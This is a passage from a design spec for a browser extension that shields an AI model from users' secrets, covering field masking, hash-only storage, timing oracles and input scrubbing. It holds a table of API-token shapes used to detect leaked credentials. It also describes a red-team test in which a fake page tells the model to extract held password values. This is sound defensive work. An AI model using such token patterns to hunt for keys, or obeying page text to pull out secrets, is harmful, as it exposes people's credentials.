through the frame tree. A closed shadow root is out of the dialect's reach too: it gets the screenshot mask only when
CDP's piercing DOM read can locate the field, and nothing otherwise.

**Known limits.** A value under 8 characters (a PIN, a one-time code, a card security code) gets the channel mask only,
since a short string occurs in ordinary text and scrubbing it would both corrupt output and answer as an oracle. A value
typed and cleared before any read is never registered. A page that mirrors the value into ordinary DOM (a strength
meter, a "show password" span, a hidden field) is not marked; the value scrub catches the mirror only for a value of 8
or more characters. Layout metrics (the field's `scrollWidth`, a caret's rectangle) give an approximate length. A
transformed route (reversed, encoded) is lost by the channel mask failing, not by the scrub, which knows only the forms
it matches.

**Acceptance: Test C** of the secrets game. Tests A and B are ruling 25's, recorded only in the plan
([docs/plan/repl/README.md](../plan/repl/README.md)): told to check out for the person, the model succeeds using the
secret; told to grab the card, it cannot read it. The game's own section is written with handles; Test C stands on its
own. A fake page with four held fields: one typed by the harness as
"the user"; one filled before the run as "the password manager"; one that starts `type=password` with a value the run
did not type and is switched to `type=text`, both by the page's own show control and by the model clicking that
control itself; and one plain text input with `-webkit-text-security: disc`. The model is told to get the values, in
the person's prompt and in the page's text. A loss is the model reproducing a whole value by any route, one character
at a time included; the value stays masked in every channel, the dialect, the DOM survey, screenshots and vision. The
red team's scripted differential rows are the CI guard. The real-model run is the bench's and needs Shane's yes in
the bench session.

### A secret the model never uses is stored hash-only (ruling 32)

**Two classes, chosen when a secret is registered** (ruling 93 adds a third, `detail`, in its own section). `mask`, the
default: recognised and redacted, never usable by the model, stored without its value. `use`: kept as a value, for a
handle to use without the model reading it. A `mask` secret cannot become `use` without the value being entered again,
and the Settings page shows a `mask` secret's name only. The registry #1948 built keeps every entry as a value; under
this ruling those become `mask` entries (below).

**What a `mask` entry stores**, per form of its value (the forms below): the form's length `L`, a short keyed filter
hash `F` of its first `k` characters, and a slow confirm hash `C` of the whole form; never the value. The key `K` and a
per-entry salt are random, generated once and kept beside the entries in local storage, never synced or backed up.

**Matching, one pass a crossing.** Slide a window of `k` characters over the text with a rolling keyed hash (a
polynomial hash with a random base drawn from `K`), truncate it to `w` bits, and look each position up in the table of
every stored `F`. The window slides over UTF-16 code units, the unit JavaScript's strings are in, and every `L` and `k`
counts the same unit. A streamed crossing (a live output, a read range) carries the last `max(L) - 1` units of one chunk
into the next, so a form cut by a chunk boundary is still seen whole. A form shorter than `k` units is never stored;
deriving one is refused, and a row asserts it. A position that hits is a candidate for each entry with that filter; for
each, compute `C` over the `L` characters starting there, and a match is a replacement. One pass serves every entry and
every form whatever their lengths, since all filters are over the first `k` characters; `k` is the 8-character floor.

**The forms** are derived when the value is registered, while it is in hand, and each gets its own `(L, F, C)`: as
written, JSON-escaped, percent-encoded, base64 standard and URL-safe at each of the three byte alignments a value can
take inside a longer base64 run, and shell-escaped (single-quoted with `'\''`, and backslash-escaped). That is the
plaintext scrub's list from #1948, so a `mask` entry matches no fewer forms than a value entry does.

**What it costs, and what a stolen store gives.** With `E` stored forms, a text of `N` characters and a `w`-bit filter,
a crossing pays one rolling pass over `N`, plus about `N·E / 2^w` false candidates, each a slow confirm at cost `c`. An
attacker with the store pays the same per guess: a cheap filter over a dictionary of `D` candidate values, then
`D / 2^w` slow confirms. The filter is what lets a crossing run at line rate, and it gives an attacker the same rate. A
stolen store also gives each secret's exact length, since `L` of the as-written form is it. So hash-only storage
protects a high-entropy secret (an API token, a generated password) completely, removes the value from disk and from
anything that reads storage, and does not protect a weak password from offline guessing by whoever holds the profile.
The spec states that, not more. The widths are provisional until measured: `k = 8`, `w = 24` and a slow hash
(PBKDF2-SHA256 through WebCrypto) at about a millisecond. Measured (`mask-matcher.ipynb`, #1959): a secret gives about 5
distinct forms, not 11, so at 64 entries `E` is about 313 and a crossing raises about 20 false candidates a MiB in
expectation; on repetitive text (JSON, logs) they arrive in clumps, a collision with a frequent window counted once per
occurrence. Two requirements follow. The confirm is memoised within one crossing, keyed on the form and the candidate's
full `L` units, never on the `k`-unit window alone, so a clump costs one confirm. Keyed on the window, a text holding a
secret's first 8 units followed by other text would cache "no" and leave a real occurrence later in the same crossing
unredacted; the build has a row for exactly that text. And a crossing's time budget is set from the tail of its cost,
not its mean. The widths stay provisional until they are fixed from that notebook (the coordinator's call).

**A timing oracle.** The slow confirm runs only on a filter hit, so a crossing's time tells a text holding a stored
8-character prefix from one that does not: a prefix oracle beside the redaction oracle in "The scrub as built". It is
observable on the worker's side: the notebook (#1959) separates one hit by a difference of two means (`z = 2`) after
about 5 to 47 crossings of each at 20,000 iterations and about 1,000 to 10,500 at 1,000, on a loaded machine. So the
remedy is REQUIRED, not conditional (the coordinator's call, surfaced to Shane): the confirm cost is paid on a fixed
schedule, or a page's crossing is answered no sooner than a floor. The end-to-end run from a page through `forPage`
sizes the remedy; it does not decide whether there is one.

**Short values.** The 8-character floor stays for `mask` entries. A string of `n` characters over an alphabet of size
`a` occurs about `N / a^n` times in `N` characters of text that looks random to it: a 4-digit PIN about 100 times in a
MiB of digits, an 8-character alphanumeric value effectively never. A short value is the channel mask's to hold, not
the scrub's.

**Upgrade.** On the first start of the version that has the two classes, every entry #1948 wrote as `{ name, value }`
becomes a `mask` entry: its forms' `(L, F, C)` are derived and the value is deleted, in one write. Until that write
succeeds the old entries stay and are matched as before, so a failed upgrade never stops the scrub, and it is retried
at the next start. No entry is `use` after the upgrade, since nothing used values before handles. The row: a fixture of
what #1948 wrote, read by the new code, still scrubs the value, and the store then holds no value.

### Setting up the store is an inbox item (ruling 33)

Once ruling 32's store and its Settings page exist, setting it up is an item in the chat page's attention inbox
(`AttentionPage`, `src/chat/attention-page.tsx`, items from `src/chat/attention.ts`), not a second inbox. Coordinator's
calls, each surfaced to Shane:

- **The item** is a new runtime code reported by `src/sw/sw-attention.ts`, `secrets-not-set-up`, at level `suggests`,
  with a fix action that opens the form, and the inbox's existing dismiss (`dismiss` and `dismissed` in
  `src/chat/view-mode.tsx`). The code carries no name and no value, only that the registry is empty.
- **When.** It appears once the store is available and the registry is empty. A dismissal is durable and per profile.
  Someone who already has entries never sees it, and Settings stays the permanent way in.
- **What it says (ruling 42).** The item recommends setting the store up, and says why: most people's models have
  `ml.sh`, and what it reads (files, command output, the environment) is where secrets reach a model. Its two actions
  are set up and dismiss.
- **Whose gesture.** Filling is the person's alone. No model tool, page message, `change_setting` or `ml.settings`
  can create, fill or dismiss the item, and the model never sees the form's fields or values: ruling 30's channel mask
  applies to our own form as to any page's.
- **The form.** Each row is a name, a value and a type, the type `mask` by default. The text says in plain words what
  each type does: `mask` is recognised and redacted, never usable by the model, and stored as hashes only; `use` is
  kept as a value so the model can use it through a handle without reading it. It also says the limits: a value
  under 8 characters, and a value that is transformed before it is printed. Ruling 94 (below) replaces this text with
  the three kinds' lines.
- **Where values are entered.** In the first build, only in the renderer the extension hosts. A remote host of the
  renderer (the web build, the phone) shows the item and the explanation, and its fix action explains that entry is
  on the computer, deferred as ruling 24 defers a remote unhide. The phone's native inbox receives state-level codes
  already (`src/native/snapshot.ts`), so the item shows there with no hub change. Entering a value remotely later
  would carry a value inside a sealed command to the runtime. The hub passes sealed payloads opaquely, so it would
  likely need no change, but a value crossing devices is a new kind of payload and gets its own ruling then.
- **Who builds it.** The chat page lane, after this spec merges and the store's Settings page exists.

### What the person sends is scrubbed too (ruling 39)

**The ruling.** The scrub applies to what the person sends, unless they flag that input as not to be redacted. The
reason is the accident: a token pasted with the text around it, a selection that held one, an attached file with a
key in it. This lifts the known limit "the person's own turn and the page context the run is started with" of "The
scrub as built" once it is built. The calls below are the coordinator's (plan PR
[#1966](https://github.com/parawanderer/window-ml/pull/1966)), each surfaced to Shane and theirs to override; the ones
marked "recommended" are this spec's, still open.

**Two detectors.**

- **By value**: the registry matcher of #1948, and under ruling 32 the `mask` entries, which match without a stored
  value. A match is `[REDACTED:<NAME>]`, as in a tool result.
- **By shape**: known token formats, each a prefix or a frame plus a length and an alphabet, so the prefix alone in
  prose never fires. The first list: vendor prefixes (`sk-` and `sk-ant-`, `ghp_`, `gho_`, `ghs_`, `ghu_`,
  `github_pat_`, `glpat-`, `xox[abprs]-`, `AKIA` and `ASIA` with 16 more, `AIza` with 35 more, `sk_live_` and
  `rk_live_`), a PEM private key block from its `-----BEGIN` line to its `-----END` line, and a JWT (three base64url
  parts, the first two decoding to JSON objects). A match is `[REDACTED:<kind>]`, the kind a lowercase slug
  (`github-token`, `pem-private-key`, `jwt`), so it can never be read as a registry name, which is upper case by its
  bound.
- **LLM provider tokens (ruling 43)** are a named group in the shape list: they have standard formats and are
  high-value targets for resale. The group replaces the first list's `sk-`, `sk-ant-` and `AIza` entries. Each shape
  below is taken from a published detector: gitleaks' `config/gitleaks.toml` (master at `5f6ec56c`, 2026-10-23) or
  trufflehog's `pkg/detectors/<vendor>/<vendor>.go` (main at `ffdee00a`, 2026-11-16). GitHub secret scanning's
  [supported-patterns list](https://docs.github.com/en/code-security/secret-scanning/introduction/supported-secret-scanning-patterns)
  names these vendors' token types but not their shapes. Where the two detectors differ, the wider shape is kept.

  | Vendor | Kind | Shape | Source |
  | --- | --- | --- | --- |
  | OpenAI | `openai-key` | `sk-proj-`, `sk-svcacct-` or `sk-admin-`, then 58 or 74 of `[A-Za-z0-9_-]`, `T3BlbkFJ`, 58 or 74 more; the legacy form `sk-`, 20 of `[A-Za-z0-9]`, `T3BlbkFJ`, 20 more | gitleaks `openai-api-key`; trufflehog `openai`, `openaiadmin` |
  | Anthropic | `anthropic-key` | `sk-ant-api03-` or `sk-ant-admin01-`, 93 of `[A-Za-z0-9_-]`, then `AA` | gitleaks `anthropic-api-key`, `anthropic-admin-api-key`; trufflehog `anthropic` |
  | OpenRouter | `openrouter-key` | `sk-or-v1-`, 64 of `[0-9a-f]` | trufflehog `openrouter` |
  | Hugging Face | `huggingface-token` | `hf_` or `api_org_`, 34 of `[A-Za-z0-9]` (gitleaks allows letters only) | gitleaks `huggingface-access-token`, `huggingface-organization-api-token`; trufflehog `huggingface` |
  | Groq | `groq-key` | `gsk_`, 52 of `[A-Za-z0-9]` | trufflehog `groq` |
  | xAI | `xai-key` | `xai-`, 80 of `[A-Za-z0-9_]` | trufflehog `xai` |
  | Replicate | `replicate-token` | `r8_`, 37 of `[A-Za-z0-9_-]` | trufflehog `replicate` |
  | Perplexity | `perplexity-key` | `pplx-`, 48 of `[A-Za-z0-9]` | gitleaks `perplexity-api-key` |
  | NVIDIA | `nvidia-key` | `nvapi-`, 64 of `[A-Za-z0-9_-]` | trufflehog `nvapi` |
  | Fireworks | `fireworks-key` | `fw_`, 20 to 40 of `[A-Za-z0-9]` | trufflehog `fireworks` |
  | LangSmith | `langsmith-key` | `lsv2_pt_` or `lsv2_sk_`, 32 of `[0-9a-f]`, `_`, 10 of `[0-9a-f]` | trufflehog `langsmith` |
  | Google | `google-api-key` | `AIza`, 35 of `[A-Za-z0-9_-]` | gitleaks `gcp-api-key` |

  Each shape ends at a word boundary, as both detectors' do. Not verified, so not in the table: `sk-ant-oat01-`
  (Anthropic's OAuth token), which neither detector nor GitHub's list gives a shape for; the loose fallback catches it.
  Rows, one per vendor: a fixture of the shape matches as its kind, and the bare prefix in prose ("set `hf_` before the
  name", "the `gsk_` prefix") does not. A fixture is built from its parts when the test runs, never committed whole, so
  push protection and the repository's own scanners do not read it as a leaked key.

  **The loose fallback.** The table's lengths are a leak detector's, which wants precision; a redactor wants recall,
  since a miss sends the key. So under the table, for a prefix that does not occur in prose (`sk-proj-`,
  `sk-svcacct-`, `sk-admin-`, `sk-ant-`, `sk-or-v1-`, `gsk_`, `xai-`, `nvapi-`, `pplx-`, `r8_`, `lsv2_`), the prefix and
  at least 20 characters of that vendor's alphabet (the table's, `[A-Za-z0-9_-]` for `sk-ant-`) match as that vendor's
  kind. A bare `sk-` and at least 20 of `[A-Za-z0-9]` with at least one digit among them matches as `api-key`: this is
  the `sk-` and 32 that DeepSeek and OpenWebUI issue. N is 20, the legacy OpenAI key's half-length: shorter than any
  key in the table, longer than a word. The digit keeps out a 20-letter word after a hyphen; a 32-character
  lowercase key with no digit at all is about 3 in 100,000 and is missed. Where two shapes match one span, the
  vendor's wins over `api-key`, and the longer match wins between vendors. The exact shapes stay as the rows'
  fixtures. Rows: a key one character longer than its table shape still matches as its kind; `sk-ant-oat01-` and 20
  characters matches as `anthropic-key`; `sk-` and 32 lowercase alphanumerics with a digit matches as `api-key`; `sk-`
  in prose ("the `sk-` prefix") and a hyphenated word starting `sk-` ("sk-learn", "sk-internationalization") do not.
- **Vendors with no prefix cannot be caught by shape.** Mistral and Together have no shape in either detector. Cohere's
  (40 of `[A-Za-z0-9]`, gitleaks `cohere-api-token`), Azure OpenAI's (32 of `[0-9a-f]`, trufflehog `azure_openai`) and
  DeepSeek's (`sk-` and 32 of `[a-z0-9]`, trufflehog `deepseek`, caught here by the loose fallback as `api-key`) are
  matched there only beside a vendor word or a key name. Those are the credential-word patterns ruling 40's
  investigation decides on. Such a key saved as the extension's own (below) or registered is caught by value.
- **No entropy-only detector** until a notebook gives its false-positive rate on real prompts, which hold commit
  hashes, UUIDs, base64 and minified code (ruling 40: left until that investigation, which follows the shape
  detector). A pattern that needs a credential word beside the value (`password=`) waits for the same notebook.

**Where.** At the point where input becomes a turn: in the worker, before the session store writes it and before the
model reads it, so what is stored is what the model saw. That point is, today:

- an agent run's first turn (`buildMessages` in `agent-host.ts`, the task and the page context `firstUserTurn` adds),
  and a later turn (`pushUser`, a `say()` or a steer drained from the inbox);
- the chat page's direct chat (`sw-chat.ts`), the typed words and the `<file>` blocks `frameFiles` adds;
- an attachment's text when `sw-attach.ts` writes it to the value store, so the file is scrubbed at rest and every
  read of its `@file:` pointer is too;
- the prompt string of a page-started call (`ml.agent`, `ml.step`, a page's model request). A page-started model
  request is already scrubbed by value in #1948 (`forBackendFromPage`); ruling 39 adds the shape detector there and
  the same scrub for a page-started run's task.

A turn the person started shows names; a page-started string gets the bare `[REDACTED]` of #1948, in every role,
since the page reads the reply. An image is not scrubbed (the known limit of "The scrub as built"). A page-started
string now crosses the shape detector and, under ruling 32, the `mask` confirm, so the timing-oracle remedy of "A
secret the model never uses is stored hash-only" is required on this crossing as on the others.

**An attachment at rest, and `/files`.** What is scrubbed at rest is the extracted text `sw-attach.ts` writes to the
value store. The file's bytes under `/files` (the `/files` section of `FILE_ATTACHMENTS.md`) are not altered: that
copy is the person's file as attached, and a read of it through the mount is a different crossing, with that
section's same-length filler.

**Sessions stored before this.** A session stored before this lands holds the person's turns unscrubbed. Such a turn
is scrubbed when it crosses to the model on a resume (`forModelHistory`), with every exemption absent, and is not
rewritten at rest; re-scrubbing stored sessions is the later slice "The scrub as built" names.

**What the model reads.** The placeholder in place, and one line after the turn in the wording tool results use
(`redactedNote`), with names or kinds and a count, so the model does not think the person typed a placeholder.

**What the person sees.** In the composer, a chip on each detected span, naming the entry or the kind, with "send as is"
for that one value. A detection never blocks a send; a store that cannot be read holds it (ruling 44, below). The
composer asks the worker over an extension-only message (the shape of `SECRET_REGISTRY`), debounced, and gets spans and
names back, never a value: the text is the composer's own. An attachment with detections shows a count on its chip, with
"send as is" for the whole file and, in the chip's detail, for each value; a value the person takes is kept in the
stored text and recorded as the other exemptions are (below). After a send, the transcript shows the placeholder the
model saw and that the scrub fired, beside the raw view the "what the model saw" rule asks for. Recommended: in the
first build the chip is in the composers the extension hosts (the sidebar and the chat page in the extension); a remote
host of the renderer (the web build, the phone) gets the scrub at the runtime and the transcript's marker, and the chip
there waits until the scan answer can ride the hub.

**The flag, three levels.**

- **Per value**: "send as is" on a chip. The scan (`SCAN_TURN`, an extension sender's only) answers each span with
  its offsets, its name and a token: HMAC-SHA256 of the span's content under a random key the worker keeps in
  `chrome.storage.session` (`ml_turn_exempt_key`), which no content script or page reads and which never enters a turn,
  an export, the run log or anything the model reads. The send carries the tokens of the exempt spans, never an
  offset, since the draft can change between the scan and the send. The worker matches again at the send and exempts a
  value only where the token made from its content is one the turn carries, so a token made for one value exempts no
  other, and text edited around a value leaves it exempt while an edited value is scrubbed. A key that cannot be read,
  or one minted again after the browser cleared session storage, matches no token: the send exempts nothing, and the
  chip shows again on the next scan. The exemption is accepted only from the person's own surfaces (the HUD's and
  sidebar's composer, an extension page's call, this browser's chat page), never from a page or a hub device; from
  them the field is ignored and the turn is scrubbed. No token is stored: a run's stored turn is what the model read,
  and a resume does not scrub it again (`inputScrubbed`), and a chat sends the turns it stored from `scrubbedFrom` on
  as they are, so a later crossing of the turn leaves the value sent as is and scrubs nothing it did not already
  scrub. The value sent as is is in the stored turn and in both exports, because it is what the model read, and the
  turn's display names it (`asIs`), so a reader sees it was sent on purpose. Every other crossing still scrubs the
  value: a tool result that echoes it is redacted as before.
- **Per call**: an option, `scrubInput: false`, on the calls that start or extend a run (`ml.agent`, `ml.step`,
  `createAgent`, `say`). Built so far in the worker only: `START_RUN`, `RESUME_RUN` and `INJECT_MESSAGE` take it,
  honoured for an extension page's call. `ml.agent`, `ml.step`, `createAgent` and `say` get it in ruling 39's PR 3,
  where it has an effect from a page.
- **One setting**, `scrubPersonInput`, on by default, in the DevTools Settings panel. It is the person's: never
  written by `change_setting`, `ml.settings` or a page. The upgrade row: a stored config from before the key reads
  as on.

**The extension's own key, with no registration.** The by-value detector also matches the key the extension itself
holds, the saved `apiKey` (OpenWebUI's bearer key, `chrome.storage.sync`) and the replaced keys the worker remembers
(`retired` in `sw-scrub.ts`, up to 8), as the config holds it: a value, in the forms `secretsOf` gives, and only from
12 characters (`MIN_KEY`). A match is `[REDACTED:window-ml-api-key]`, a lowercase slug so it never meets a registry
name. #1948 does not do this: its `secretsOf` scrub (`apiKey`, the chat and price URLs, the model filter) runs at the
crossings into a model or script, and the person's input is not one of them. The extension holds no other model key:
a cloud provider's key is a connection in OpenWebUI (`docs/CLOUD-MODELS.md`), out of the extension's reach, and the
shape list is what catches it in a person's turn. The URLs and the model filter are not matched in the person's
input: they are not credentials, and the person names them in ordinary questions. Row: with an empty registry, a turn
holding the saved key, and one holding a key replaced since the worker started, each reach the model as
`[REDACTED:window-ml-api-key]`; an 11-character key is not matched.

The most specific level wins. A page may pass the option for its own string and never changes the setting.
Recommended: a page's `scrubInput: false` turns off the SHAPE detector only. A registered value is the person's own
declaration, and a page is not the person, so a page-started string is always scrubbed by value, as #1948 already
does; Shane's line that a default-held value must never reach the model without the person's override is the reason.

**The open points: ruled since, or recommended.**

- **A detected value is offered to the store (ruling 41)**, in a way the person can ignore at no cost. The offer is on
  the chip, while the draft still holds the value: "Remember as a secret" opens the store's add row with the kind as
  the name and `mask` as the type, and nothing is added without the person's save. With no store set up, the chip
  offers the same "Remember as a secret", and it opens the store's setup (ruling 33's form) first, then the add row
  with the value. Ignoring it costs nothing: no dialog, no extra click to send, and the offer goes when the draft is
  sent. Row, with a store and with none: a draft with a detected value sends on the first click with nothing added to
  the store and no store set up, and after the send no offer remains in the composer or the transcript; with none,
  taking the offer opens setup before the add row. Never as an inbox item: an item would have to hold the value until
  acted on, which is storing it unregistered. Never from a remote host (ruling 33 defers remote entry) and never from
  a page-started string.
- **No store set up (ruling 42).** By value has nothing to match and the shape detector runs anyway, since it needs
  no store. The person gets ruling 33's inbox item, which recommends setting the store up or dismissing it. A
  detection while no store is set up does not raise the item again once it is dismissed: the dismissal is durable,
  and Settings stays the way in. Row: a shape detection with an empty registry and a dismissed item adds no inbox
  item.
- **A store that cannot be READ (ruling 44)** is not an empty one: the turn is held in the composer with the reason
  and a retry, and "send as is" for the whole turn is the person's override. A detection never blocks a send; this
  is the one hold, and it fails closed as #1948 fails every other crossing. A caller with no composer (`ml.agent` from
  the console, a script's `say`, a steer from the inbox) is rejected with an error that says the secret store could
  not be read and names `scrubInput: false`, which only an extension-page caller can use to send anyway: from a page
  the option is shape-only, so a page-started call is rejected until the store can be read. A remote host (the web
  build, the phone) gets the same rejection from the runtime and shows it with a retry. In the first build a remote
  person has no per-value override; the only override is the runtime's `scrubPersonInput` setting, changed on the
  computer.
- **Shared with the host's `looks_secret`, or separate?** Recommended: separate. `looks_secret`
  (`src/facts.rs` in window-ml-host) classifies a PATH by its components (`.env`, `id_*`, `*.pem`, `.ssh/`); the
  shape list classifies TEXT. One list would hold two kinds of rule. The shape list is shared within the extension
  instead: one module that this detector and scrub PR 2's patterns over tool output both read, so a person's turn
  and a tool result are judged by the same shapes. An attachment whose file name `looks_secret` would match is a
  candidate for a stronger default later, from a copy of the host's list with a parity row, not from this list.

**Rows the build lands with.**

- A registered value typed, pasted, in an attachment's text, in a page selection and in a later `say()` comes out
  redacted in what the model read and in the stored session, and the value is in neither.
- Each shape matches its fixture and does not match its prefix in prose, a commit hash, a UUID or plain base64.
- "Send as is" sends that span only; a second value in the same turn is still redacted, and a resumed history keeps
  the exempt span and scrubs the rest.
- "Send as is" exempts the span whose content matches the turn's digest; a draft edited after the scan so that the
  digest no longer matches gets the span redacted. A page-started call that passes an exemption gets the value
  redacted (e3's row).
- `scrubInput: false` from the person's call sends the turn as is; from a page it leaves the registered value
  redacted (e3's row).
- An attachment holding a registered value is redacted in the value store's text and left as attached under
  `/files`; "send as is" on its chip keeps the value in the stored text.
- The upgrade: a fixture session written by the old code, with a registered value in a person's turn, is resumed,
  and the model's history holds the placeholder while the stored session is unchanged.
- No page, content script or model tool can send the scan message, change `scrubPersonInput` or learn a name (e3's
  rows), and a janitor reads the build.

### A session row leaves the worker scrubbed (RULED 2026-11-19: Shane, ruling 61, in the coordinator's session)

**The rule.** A session row (`SessionSummary`) is scrubbed by registered value wherever it leaves the worker:

- the session server's index updates and the snapshot a page gets when it attaches;
- the sinks, the hub's among them, which seal and publish it to every paired device;
- the hub runtime's list;
- `sessions.list` and `sessions.search`, live and archived rows and a search's snippet;
- the HUD's bring-here list, a held run's page URL included;
- the Settings storage report's titles.

Every string in the row but its identifiers (`id`, `kind`, `status`, `model`, `startedBy.id` and `.kind`, `lineage`'s
ids; `ROW_IDENTIFIERS` in [`session-row-scrub.ts`](../../src/session/session-row-scrub.ts)) is text and is scrubbed:
the task, the title, the page's URL and title, a device's name, and a field a later build adds, without naming it. A
match is `[REDACTED:<NAME>]`, as in the person's own turn. The index keeps its rows as they are and each exit scrubs, so
a value registered after a row was sent is sent again scrubbed (`onRegistryChanged`), and a row an older build stored
leaves scrubbed. A live search matches the text a client is sent, so a query holding a value finds nothing and confirms
no guess. By registered value only: a token-shaped string that is not registered is the shape detector's (ruling 39,
"Two detectors").

**Fails closed.** The scrub is synchronous, since the index is sent from synchronous code. Before the registry's first
read, a row's text is withheld: a client reads the field as absent, and a page whose URL is withheld is dropped whole.
The row is sent again once the read succeeds.

**What the person sees.** A task they typed with a registered value in it shows on every device, the chat page in
the extension included, as their words with `[REDACTED:<NAME>]` in place of the value, and so does a title made from
it. Ruling 39's transcript shows the same placeholder. A value the person sent on purpose ("send as is",
`scrubInput: false`, `scrubPersonInput` off) is scrubbed from the row too: the exemption covers the model and the
store, and the row is one of the "other crossings" that still scrub it. Shane ruled it so (ruling 61); the other
reading, honouring the turn's exemption in the row, was declined. The row scrub reads no digest of the turn's, so
honouring it later is an addition. Its cost: on a phone, a session's transcript shows a sent-as-is value while its
list row shows the marker.

**Known limits.** A turn sent with `scrubPersonInput` off or `scrubInput: false`, or stored before ruling 39's by-value
scrub, holds a registered value the person typed, so the transcript shows it while the row shows the marker; a session
stored before the scrub is not rewritten, and only its user turns on the way to the model on a resume are scrubbed. An
archived session's search runs over its stored text in the archive, so a query holding a value can match it; the row and
snippet that come back are scrubbed. A link built from a scrubbed URL opens the URL with the marker in it. A row's keys
are scrubbed as its text is (two that scrub to one text are numbered); before the registry's first read, a key is kept
only when it has a schema's shape (letters only, lowercase first, at most 32), so a registered value of that shape used
as a key survives that path.

### Personal details: a third kind of registered value (ruling 93)

**The ruling** (Shane, 2026-11-20, in the coordinator's session). The registry gets a kind for a personal detail: a full
name, an address, a phone number. The model never sees one. It can fill one into a form by name, and the value is
blanked in text and in screenshots. Nothing here is built. The kind is `detail`, beside ruling 32's `mask` and `use`.

**Stored as a value.** A `detail` entry keeps its value in `ml_secret_registry`, as a `use` entry does, for two reasons:
a handle needs the value to fill a field, and the screenshot mask needs it to find rendered text. Hash-only storage
would buy nothing here. A name or an address is in a dictionary, and ruling 32 states that a weak value is not protected
from offline guessing by whoever holds the profile. What protects a `detail` is the store's place (local, never synced,
backed up or exported, "The scrub as built") and not its form. The bounds are the registry's: one of the 64 entries, at
most 512 characters, a name matching `[A-Z0-9_]{1,40}`. The minimum length differs (below).

**The looser match.** A detail is written by people and pages in many ways, so the exact match misses most of them. The
rule, applied to the registered value and to the text alike:

1. Unicode NFKC, then `toLowerCase()` with no locale, which folds case (`ANN LEE` and `Ann Lee` match).
2. Each run of whitespace (any character `\s` matches, the no-break space, a newline and a tab included) becomes one
   space, and the registered value is trimmed. An address split over two lines matches the same address on one.
3. A match is bounded: the character before it and the one after it are neither a letter nor a digit (`\p{L}`,
   `\p{N}`), so `Ann Lee` does not match inside `Joann Leeds`.
4. The text keeps a map from each normalised unit back to the original, so the replacement covers the original span,
   its own case and whitespace included.

**Not folded**, each a limit stated to the person: diacritics (`Zoë` and `Zoe` are two values), punctuation and
abbreviation (`St.` and `Street`), a hyphen for a space, and order (`Lee, Ann`). In a script written without spaces
(Chinese, Japanese, Thai) a name inside a sentence has a letter on both sides, so step 3's bound never lets it match:
a gap, not lifted in the first build, since dropping the bound for those scripts would match a short name inside
unrelated words. An entry may carry up to 4 variants
under one name (proposed), each matched as the value is. A variant counts toward the registry's forms, not its entries.

**A phone number** (proposed, beyond the ruling's minimum). A value made of digits and the separators `+`, space, `.`,
`-`, `(` and `)` also matches any run of the same digits in the same order with any of those separators between them,
bounded by non-digits. `+32 470 12 34 56` then matches `+32470123456` and `+32 (470) 12.34.56`. A national form
(`0470 12 34 56` for the same number) is a variant, never derived, since which prefix replaces a country code differs by
country. The rule applies only when the value holds at least 7 digits.

**The forms.** The looser match applies to the value as written and JSON-escaped, where the escapes `\n`, `\r`, `\t`
and the no-break space's escape (a backslash, then `u00a0`) count as whitespace. A percent-encoded form matches with a
space as `%20` or `+` and the hex digits in either case. The base64 and shell-escaped forms are matched exactly as
written, since case folding breaks base64; a detail inside base64 is caught only in the case it was registered in.

**The minimum length, and what a false hit costs** (proposed). A `detail` is at least 6 characters after normalisation,
not 8. `Ann Lee` is 7, and a detail is meant to match ordinary text, so the floor's reason for a `mask` entry (a short
value occurs by chance) does not apply in the same way. What a false hit costs:

- The model reads `[REDACTED:FULL_NAME]` where the text held someone else with that name, or a street that shares a
  name with one in the person's address. The output is corrupted for that span only.
- A task that needs the model to read the detail fails: "check the delivery address on this order" shows the model only
  the marker. That is what the kind is for. The person's own turn can carry the value with ruling 39's "send as is";
  a page's text has no such flag.
- A one-word value (no whitespace and no digit: a surname alone, a city) blanks every occurrence on every page. The
  form allows it, says so in one line, and suggests the full form.

The hit rate on real pages is measured in the build PR, on captured page text with synthetic common names and
addresses, as ruling 39's patterns are measured on real output; the floor of 6 stays provisional until then (the
coordinator's call).

**Where it is matched.** Every crossing "The scrub as built" lists, with two exceptions, and each covers only text the
page itself supplied. A page-started model request (`FETCH_LLM` and the stream port) and an error answered to a page
(`forPage`) skip `detail` entries. The page composed every message of its own request and holds the text of its own
error, so scrubbing a detail there hides nothing from the page. Text the worker adds to a run a page started (a fetch
made with the person's cookies, a tool result from another tab, in a run the worker hosts) is the worker's, not the
page's, and is scrubbed of details as of any entry. A detail the worker hands a page inside an answer's `data` is
outside the scrub already ("Known limits" of "The scrub as built"), so the skip adds no route of its own. Scrubbing it
would also give an approved page a cheap way to confirm a guess: it sends a candidate name, and the model it drives
repeats the marker. For a high-entropy `mask` value that oracle is the known limit already stated; a name or an address
is cheap to guess, so for those it becomes a real leak. The turn the person sends is scrubbed of details as of any entry
(ruling 39).

**Use by handle.** A `detail` is filled by name with the handle mechanism ("Shape" above): the run is granted entries
by name, and the model holds a handle with no data in it. What differs from a `use` secret:

- **The sink is a page field, not a background fetch.** `type` takes a handle for the whole value of a field
  (`{ handle: "HOME_ADDRESS" }`). The worker writes the value; the model's arguments, the step's display and both
  exports show `[detail: HOME_ADDRESS]`.
- **The scope is an origin**: the origin of the frame that owns the field, not the top page's. The first fill of an
  entry on that origin in a run asks, and the card names the entry and the origin. A field in a cross-origin frame
  asks for that frame's origin, and the card shows both the frame's origin and the top page's. A policy can allow it
  after that (`docs/spec/POLICIES.md`). A `use` secret's path, method and header scope do not apply.
- **No `echoes` refusal.** A page that shows the detail back (an order's confirmation) is the normal case. The scrub
  blanks it on the way to the model, so nothing is refused.
- **Ruling 30's exemption does not apply.** That exemption covers a password-class field holding what the run typed.
  A detail is scrubbed by value wherever it is read, whoever wrote it, so the field the run filled reads back as the
  marker.
- **Parts.** An address form has separate fields (street, city, postcode). Each part is its own entry
  (`HOME_STREET`, `HOME_CITY`, `HOME_POSTCODE`); the registry has no structured detail. A part under 6 characters (a
  4-digit postcode) can be filled by handle but is not scrubbed.
- **Not in the first build:** a handle inside longer text (a letter signed with `FULL_NAME`). It would make every typed
  text a sink, and it stays open.

**Masked in screenshots, `look` and `locate`.** Ruling 30's channel mask blanks a held FIELD. A detail is any rendered
text, so the mask finds it in the page first. For each capture:

1. **Find.** The content script, in its isolated world, walks the text nodes of the document, its same-origin frames and
   its open shadow roots. It groups them by their nearest block-level ancestor (a computed `display` that is not an
   inline one) and joins each group's text in DOM order. It runs the looser match over each joined text and turns each
   match into a `Range`, which may span several text nodes. It takes the range's `getClientRects()`. An `input`'s or a
   `textarea`'s value is matched alone, and its rectangle is the element's box.
2. **Capture**, through the path the tool uses today.
3. **Find again**, and paint the union of both reads' rectangles opaque, padded by 2 CSS pixels and scaled by the
